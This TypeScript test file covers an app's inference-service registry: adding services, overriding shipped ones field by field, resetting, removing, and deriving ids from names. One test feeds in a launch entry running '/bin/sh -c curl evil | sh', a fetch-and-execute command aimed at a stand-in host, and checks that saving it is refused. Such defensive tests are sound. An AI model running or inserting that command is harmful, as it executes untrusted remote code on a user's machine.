// ADDING A SERVICE, AND CHANGING ONE — the user layer of the inference registry.
//
// Two properties are being defended, and they are the same two the engine-params patch defends
// one level down: what you did not name, you inherit; what you set back to the shipped value
// stops being yours. Plus the one that is only true here — a page cannot describe something for
// this process to execute (PLAN §15 rule 1).

import assert from 'node:assert/strict'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import test from 'node:test'

import { capsFor } from '../src/inference/engines.ts'
import { SERVICE_PRESETS } from '../src/inference/presets.ts'
import { REGISTRY_FILE, loadInferenceRegistry } from '../src/inference/registry.ts'
import { ServiceError, idFromName, removeService, saveService } from '../src/inference/services.ts'
import type { Roots } from '../src/paths.ts'
import type { InferenceRow, NetTransport } from '../src/types/inference.ts'

/** The endpoint half of a transport. A test asking for a host is asking about a row that HAS one;
 *  a `cli` row has no endpoint at all, which is the whole reason the type is a union. */
const net = (row: InferenceRow | undefined): NetTransport | undefined =>
  (row?.transport && row.transport.kind !== 'cli' ? row.transport : undefined)

const SHIPPED = {
  services: [{
    id: 'draw-things-grpc',
    label: 'Draw Things (gRPC)',
    transport: { kind: 'grpc', host: '127.0.0.1', port: 7859 },
    health: { kind: 'tcp', timeoutMs: 500 },
    caps: {
      negatives: true, idiom: 'prose', words: [20, 120], resolution: [512, 1536],
      stepsLocked: null, batch: false,
    },
    engines: [
      { file: 'sdxl.ckpt', label: 'SDXL', params: { steps: 16 } },
      { file: 'klein.ckpt', label: 'klein', default: true, caps: { stepsLocked: 4, negatives: false } },
    ],
    notes: 'the one this app ships',
  }],
}

async function library(): Promise<Roots> {
  const base = await mkdtemp(join(tmpdir(), 'xk-svc-'))
  const roots: Roots = {
    content: join(base, 'lib'), data: join(base, 'data'), install: join(base, 'app'),
  }
  await mkdir(join(roots.install, 'registries'), { recursive: true })
  await writeFile(join(roots.install, REGISTRY_FILE), JSON.stringify(SHIPPED), 'utf-8')
  return roots
}
const scrap = (roots: Roots): Promise<void> =>
  rm(join(roots.data, '..'), { recursive: true, force: true })

const stored = async (roots: Roots): Promise<Record<string, unknown>[]> =>
  (JSON.parse(await readFile(join(roots.data, REGISTRY_FILE), 'utf-8')) as {
    services: Record<string, unknown>[]
  }).services

// ── adding one ────────────────────────────────────────────────────────────────────────────

test('a service you add is reachable, probeable, and entirely yours', async () => {
  const roots = await library()
  try {
    const saved = await saveService(roots, {
      id: 'comfyui-local',
      label: 'ComfyUI',
      transport: { kind: 'http', host: '127.0.0.1', port: 8188, basePath: '/api' },
    })
    assert.equal(saved.mine, true)

    const { rows, source } = await loadInferenceRegistry(roots)
    const row = rows.find((r) => r.id === 'comfyui-local')
    assert.equal(source.get('comfyui-local'), 'user')
    assert.equal(net(row)?.port, 8188)
    // ⚠️ A ROW WITH AN ENDPOINT AND NO PROBE READS `unknown` FOREVER. The app declares the check
    // rather than asking for one — it is plumbing, not a preference.
    assert.equal(row?.health?.kind, 'tcp')
  } finally {
    await scrap(roots)
  }
})

test('a page cannot describe something for this process to run', async () => {
  const roots = await library()
  try {
    // §15 rule 1, at its narrowest: `launch` carries a binary and an argv array.
    await assert.rejects(saveService(roots, {
      id: 'sneaky', transport: { kind: 'grpc', host: 'h', port: 1 },
      launch: { mode: 'child', binary: '/bin/sh', args: ['-c', 'curl evil | sh'] },
    }), (err: ServiceError) => /never one it starts/.test(err.message))
    // And nothing was written on the way to refusing.
    await assert.rejects(readFile(join(roots.data, REGISTRY_FILE), 'utf-8'))
  } finally {
    await scrap(roots)
  }
})

test('a service that cannot be reached is refused where it is typed', async () => {
  const roots = await library()
  try {
    await assert.rejects(saveService(roots, { id: 'nowhere', label: 'Nowhere' }),
      (err: ServiceError) => /needs a transport/.test(err.message))
    // An id typed by hand (a `take`, an edited file) is still checked — it is just not asked for.
    await assert.rejects(saveService(roots, { id: 'Bad Id', label: 'Bad' }),
      (err: ServiceError) => /lowercase words joined by dashes/.test(err.message))
  } finally {
    await scrap(roots)
  }
})

// ── changing a shipped one ────────────────────────────────────────────────────────────────

test('what you did not name, you inherit', async () => {
  const roots = await library()
  try {
    await saveService(roots, {
      id: 'draw-things-grpc',
      transport: { kind: 'grpc', host: '10.0.0.4', port: 7859 },
    })
    // ⚠️ ONE FIELD ON DISK. The six checkpoint rows are NOT copied into your file, which is what
    // makes a later change to them still reach you.
    assert.deepEqual(await stored(roots), [{
      id: 'draw-things-grpc', transport: { kind: 'grpc', host: '10.0.0.4', port: 7859 },
    }])

    const { rows, source, patched } = await loadInferenceRegistry(roots)
    const row = rows.find((r) => r.id === 'draw-things-grpc')
    assert.equal(net(row)?.host, '10.0.0.4')
    assert.equal(row?.engines?.length, 2, 'the shipped checkpoints came along')
    assert.equal(row?.caps?.idiom, 'prose')
    assert.equal(row?.notes, 'the one this app ships')
    // It is still a row this app ships — you moved one field of it.
    assert.equal(source.get('draw-things-grpc'), 'shipped')
    assert.deepEqual(patched.get('draw-things-grpc'), ['transport'])
  } finally {
    await scrap(roots)
  }
})

test('setting a field back to what it shipped as is a reset, not a stored copy', async () => {
  const roots = await library()
  try {
    await saveService(roots, { id: 'draw-things-grpc', label: 'Mine', transport: { kind: 'grpc', host: '10.0.0.4', port: 7859 } })
    assert.deepEqual(Object.keys((await stored(roots))[0] ?? {}).sort(), ['id', 'label', 'transport'])

    // The label goes back to the shipped one and the endpoint stays mine: only `transport` is left.
    const saved = await saveService(roots, {
      id: 'draw-things-grpc', label: 'Draw Things (gRPC)',
      transport: { kind: 'grpc', host: '10.0.0.4', port: 7859 },
    })
    assert.deepEqual(saved.fields, ['transport'])

    // …and putting the endpoint back too leaves nothing of mine, so the row is gone rather than
    // stored as a duplicate of what the app ships.
    await saveService(roots, {
      id: 'draw-things-grpc', label: 'Draw Things (gRPC)',
      transport: { kind: 'grpc', host: '127.0.0.1', port: 7859 },
    })
    assert.deepEqual(await stored(roots), [])
  } finally {
    await scrap(roots)
  }
})

test('an override that would break the row is refused, and the shipped one stands', async () => {
  const roots = await library()
  try {
    // Written by hand: the loader is what has to survive this, not the writer.
    await mkdir(join(roots.data, 'registries'), { recursive: true })
    await writeFile(join(roots.data, REGISTRY_FILE), JSON.stringify({
      services: [{ id: 'draw-things-grpc', transport: { kind: 'grpc', host: 'h', port: 'auto' } }],
    }), 'utf-8')

    const { rows, issues } = await loadInferenceRegistry(roots)
    const row = rows.find((r) => r.id === 'draw-things-grpc')
    assert.equal(net(row)?.port, 7859, 'the shipped endpoint is still there')
    assert.ok(issues.some((i) => i.includes('auto')), issues.join('\n'))
  } finally {
    await scrap(roots)
  }
})

// ── describing a checkpoint ───────────────────────────────────────────────────────────────
//
// The layer that makes a service more than one capability. A service is a pipe: the same server
// serves a checkpoint locked to 4 steps with no negative prompt and one that takes 28 free steps
// and has one, so what a checkpoint IS belongs on the checkpoint. These defend the same two
// properties as everything above, one level further down.

/** What the editor posts: every raw declaration this service has, with the edit applied. */
const asShipped = (): Record<string, unknown>[] =>
  JSON.parse(JSON.stringify(SHIPPED.services[0]?.engines))

test('describing one checkpoint does not copy the others into your file', async () => {
  const roots = await library()
  try {
    await saveService(roots, {
      id: 'draw-things-grpc',
      engines: [...asShipped(), { file: 'kontext.ckpt', label: 'Kontext', caps: { idiom: 'tags' } }],
    })
    // ⚠️ ONE ROW ON DISK. The two shipped checkpoints went back exactly as they came, so they are
    // not yours — which is what keeps a later change to their numbers reaching you.
    assert.deepEqual(await stored(roots), [{
      id: 'draw-things-grpc',
      engines: [{ file: 'kontext.ckpt', label: 'Kontext', caps: { idiom: 'tags' } }],
    }])

    const { rows, patchedEngines } = await loadInferenceRegistry(roots)
    const row = rows.find((r) => r.id === 'draw-things-grpc')
    assert.equal(row?.engines?.length, 3)
    assert.deepEqual(row?.engines?.find((e) => e.file === 'sdxl.ckpt')?.params, { steps: 16 })
    // Yours is named by FILE, not by "the list is yours" — the ↺ verb is per checkpoint.
    assert.deepEqual(patchedEngines.get('draw-things-grpc'), ['kontext.ckpt'])
  } finally {
    await scrap(roots)
  }
})

test('a checkpoint says only where it differs from its service', async () => {
  const roots = await library()
  try {
    await saveService(roots, {
      id: 'draw-things-grpc',
      engines: [...asShipped(), { file: 'kontext.ckpt', caps: { idiom: 'tags', negatives: true } }],
    })
    const { rows } = await loadInferenceRegistry(roots)
    const row = rows.find((r) => r.id === 'draw-things-grpc')
    // THE POINT: the patch is what makes this checkpoint read differently from its service, and
    // it is a fact about the checkpoint. Everything it did not mention is still the service's.
    const caps = capsFor(row!, 'kontext.ckpt')
    assert.equal(caps.negatives, true)
    assert.equal(caps.idiom, 'tags')
    assert.equal(caps.negatives, true, 'inherited')
    assert.deepEqual(caps.resolution, [512, 1536], 'inherited')
    // …and the checkpoint beside it is untouched by any of that.
    assert.equal(capsFor(row!, 'sdxl.ckpt').idiom, 'prose')
  } finally {
    await scrap(roots)
  }
})

test('describing a checkpoint does not forget the port you moved', async () => {
  const roots = await library()
  try {
    // Two forms write this one row, each sending only its own fields.
    await saveService(roots, {
      id: 'draw-things-grpc', transport: { kind: 'grpc', host: '10.0.0.4', port: 7859 },
    })
    await saveService(roots, {
      id: 'draw-things-grpc', engines: [...asShipped(), { file: 'kontext.ckpt' }],
    })
    const { rows } = await loadInferenceRegistry(roots)
    const row = rows.find((r) => r.id === 'draw-things-grpc')
    assert.equal(net(row)?.host, '10.0.0.4', 'a POST is a patch over YOUR row, not a replacement')
    assert.equal(row?.engines?.length, 3)
  } finally {
    await scrap(roots)
  }
})

test('the default you name is the only one', async () => {
  const roots = await library()
  try {
    // Written by hand, because the merge is what has to hold this — not the form that avoids it.
    await mkdir(join(roots.data, 'registries'), { recursive: true })
    await writeFile(join(roots.data, REGISTRY_FILE), JSON.stringify({
      services: [{ id: 'draw-things-grpc', engines: [{ file: 'sdxl.ckpt', default: true }] }],
    }), 'utf-8')

    const { rows } = await loadInferenceRegistry(roots)
    const engines = rows.find((r) => r.id === 'draw-things-grpc')?.engines ?? []
    assert.deepEqual(engines.filter((e) => e.default).map((e) => e.file), ['sdxl.ckpt'],
      'naming one clears the shipped one — two defaults is a coin flip that looks like a decision')
  } finally {
    await scrap(roots)
  }
})

test('forgetting your description leaves the shipped one standing', async () => {
  const roots = await library()
  try {
    const mine = asShipped().map((e) => (e['file'] === 'sdxl.ckpt' ? { ...e, label: 'Mine' } : e))
    await saveService(roots, { id: 'draw-things-grpc', engines: mine })
    assert.equal((await loadInferenceRegistry(roots)).rows[0]?.engines?.[0]?.label, 'Mine')

    // The editor drops it by sending the list without it. One verb, two outcomes: a checkpoint
    // this app describes comes back, one that was only yours leaves.
    await saveService(roots, { id: 'draw-things-grpc', engines: asShipped() })
    const { rows } = await loadInferenceRegistry(roots)
    assert.equal(rows[0]?.engines?.[0]?.label, 'SDXL')
    assert.deepEqual(await stored(roots), [], 'and nothing of yours is left behind')
  } finally {
    await scrap(roots)
  }
})

// ── taking it back ────────────────────────────────────────────────────────────────────────

test('removing is one verb, and it says which of the two things happened', async () => {
  const roots = await library()
  try {
    await saveService(roots, { id: 'comfyui-local', transport: { kind: 'http', host: 'h', port: 8188 } })
    await saveService(roots, { id: 'draw-things-grpc', label: 'Mine' })

    assert.deepEqual(await removeService(roots, 'draw-things-grpc'), { id: 'draw-things-grpc', reverted: true })
    assert.equal((await loadInferenceRegistry(roots)).rows.find((r) => r.id === 'draw-things-grpc')?.label,
      'Draw Things (gRPC)')

    assert.deepEqual(await removeService(roots, 'comfyui-local'), { id: 'comfyui-local', reverted: false })
    assert.equal((await loadInferenceRegistry(roots)).rows.length, 1)

    // A row this app ships is not yours to delete — only to override.
    await assert.rejects(removeService(roots, 'draw-things-grpc'),
      (err: ServiceError) => err.status === 404 && /only overridden/.test(err.message))
  } finally {
    await scrap(roots)
  }
})

// ── the workflows ───────────────────────────────────────────────────────────────────────────
//
// Same two properties as `engines`, one level up: only the difference is stored, and the compare
// is PER SLUG — writing your own workflow must not freeze a copy of the ones this app ships.

test('a workflow you write is stored alone, beside the shipped ones', async () => {
  const roots = await library()
  try {
    await saveService(roots, {
      id: 'draw-things-grpc',
      workflows: [
        { slug: 'klein-t2i', kind: 't2i', model: 'klein.ckpt', inputs: ['prompt'] },
        { slug: 'sdxl-soft', kind: 'i2i', model: 'sdxl.ckpt', inputs: ['prompt', 'ref'], params: { strength: 0.4 } },
      ],
    })
    const mine = (await stored(roots))[0]?.['workflows'] as { slug: string }[]
    assert.deepEqual(mine.map((w) => w.slug), ['klein-t2i', 'sdxl-soft'],
      'the shipped list has no workflows at all here, so both are yours')

    const { rows, patchedWorkflows } = await loadInferenceRegistry(roots)
    assert.equal(rows[0]?.workflows?.length, 2)
    assert.deepEqual(patchedWorkflows.get('draw-things-grpc'), ['klein-t2i', 'sdxl-soft'])
  } finally {
    await scrap(roots)
  }
})

test('a workflow sent back exactly as it shipped is a reset, not a copy', async () => {
  const roots = await library()
  try {
    const shipped = { slug: 'kontext', kind: 'edit', model: 'klein.ckpt', inputs: ['prompt', 'ref'] }
    await writeFile(join(roots.install, REGISTRY_FILE),
      JSON.stringify({ services: [{ ...SHIPPED.services[0], workflows: [shipped] }] }), 'utf-8')

    // One workflow changed, the shipped one sent back untouched beside it.
    await saveService(roots, {
      id: 'draw-things-grpc',
      workflows: [shipped, { slug: 'mine', kind: 't2i', model: 'sdxl.ckpt', inputs: ['prompt'] }],
    })
    const mine = (await stored(roots))[0]?.['workflows'] as { slug: string }[]
    assert.deepEqual(mine.map((w) => w.slug), ['mine'], 'only the difference is stored')

    // …and the merged row still has both, because the loader joins them per slug.
    const { rows } = await loadInferenceRegistry(roots)
    assert.deepEqual(rows[0]?.workflows?.map((w) => w.slug), ['kontext', 'mine'])
  } finally {
    await scrap(roots)
  }
})

test('a workflow cannot name a kind that is not a slug, and cannot take nothing', async () => {
  const roots = await library()
  try {
    await assert.rejects(saveService(roots, {
      id: 'draw-things-grpc',
      workflows: [{ slug: 'x', kind: 'Not A Kind', model: 'sdxl.ckpt', inputs: ['prompt'] }],
    }))
    await assert.rejects(saveService(roots, {
      id: 'draw-things-grpc',
      workflows: [{ slug: 'x', kind: 'cutout', model: 'sdxl.ckpt', inputs: [] }],
    }))
    // …but a kind nobody described is fine. That is the whole point of the registry.
    const saved = await saveService(roots, {
      id: 'draw-things-grpc',
      workflows: [{ slug: 'x', kind: 'upscale', model: 'sdxl.ckpt', inputs: ['ref'] }],
    })
    assert.deepEqual(saved.fields, ['workflows'])
  } finally {
    await scrap(roots)
  }
})

// ── the id nobody types ───────────────────────────────────────────────────────────────────────

test('an id is made from the name, and a second one of the same name does not land on the first', () => {
  assert.equal(idFromName('Draw Things', []), 'draw-things')
  assert.equal(idFromName('ComfyUI', []), 'comfyui')
  assert.equal(idFromName('  My  Box @ Home! ', []), 'my-box-home')
  // An accent folds to the letter underneath rather than dropping out of the name entirely.
  assert.equal(idFromName('Rêve', []), 'reve')
  // The one that matters: an id is a run folder, so a collision has to be a NEW folder.
  assert.equal(idFromName('Draw Things', ['draw-things']), 'draw-things-2')
  assert.equal(idFromName('Draw Things', ['draw-things', 'draw-things-2']), 'draw-things-3')
  // A name with nothing to slug is refused rather than silently becoming an empty folder.
  assert.equal(idFromName('中文', []), '')
  assert.equal(idFromName('---', []), '')
})

test('adding a service asks for a name and never for an id', async () => {
  const roots = await library()
  try {
    const first = await saveService(roots, {
      label: 'Draw Things',
      transport: { kind: 'grpc', host: '127.0.0.1', port: 7859 },
    })
    assert.equal(first.id, 'draw-things')
    assert.equal(first.mine, true, 'it is not the shipped draw-things-grpc row')

    // A second one of the same name is its own service — not a silent write into the first.
    const second = await saveService(roots, {
      label: 'Draw Things',
      transport: { kind: 'grpc', host: '10.0.0.9', port: 7859 },
    })
    assert.equal(second.id, 'draw-things-2')
    assert.deepEqual((await stored(roots)).map((r) => r['id']), ['draw-things', 'draw-things-2'])

    // ⚠️ AND THE SHIPPED IDS COUNT AS TAKEN. `draw-things-grpc` is a row this test ships; a name
    // that derived onto it would edit somebody else's service instead of making yours.
    const clash = await saveService(roots, {
      label: 'Draw Things GRPC',
      transport: { kind: 'grpc', host: '10.0.0.10', port: 7859 },
    })
    assert.equal(clash.id, 'draw-things-grpc-2')

    await assert.rejects(saveService(roots, { transport: { kind: 'grpc', host: 'h', port: 1 } }),
      (err: ServiceError) => /needs a name/.test(err.message))
    await assert.rejects(saveService(roots, { label: '中文', transport: { kind: 'grpc', host: 'h', port: 1 } }),
      (err: ServiceError) => /no id could be made/.test(err.message))
  } finally {
    await scrap(roots)
  }
})

test('a preset either names a product or names a shape, and the box follows', () => {
  for (const p of SERVICE_PRESETS) {
    // ⚠️ A NAME MAY BE EMPTY, on exactly the rows that describe a SHAPE rather than a product —
    // "a plain http endpoint" has nothing true to pre-fill, so the box shows its placeholder and
    // the person types what their thing is called. A name that IS there has to make an id.
    if (p.name.trim()) assert.ok(idFromName(p.name, []), `${p.id}'s name makes no id`)
    // `suggest` is what `take` writes and is said out loud; it stays a slug either way.
    assert.match(p.suggest, /^[a-z0-9]+(-[a-z0-9]+)*$/, `${p.id}'s suggest is not a slug`)
  }
  // And the form opens on one that speaks http — the shape a service nobody has heard of speaks.
  const opens = SERVICE_PRESETS.filter((p) => p.role !== 'brain')
    .find((p) => p.transport.kind === 'http')
  assert.ok(opens, 'nothing in the list speaks plain http, so ＋ connect has nowhere to open')
  assert.equal(opens.name, '', 'the row the form opens on must not pre-fill somebody else\'s name')
})
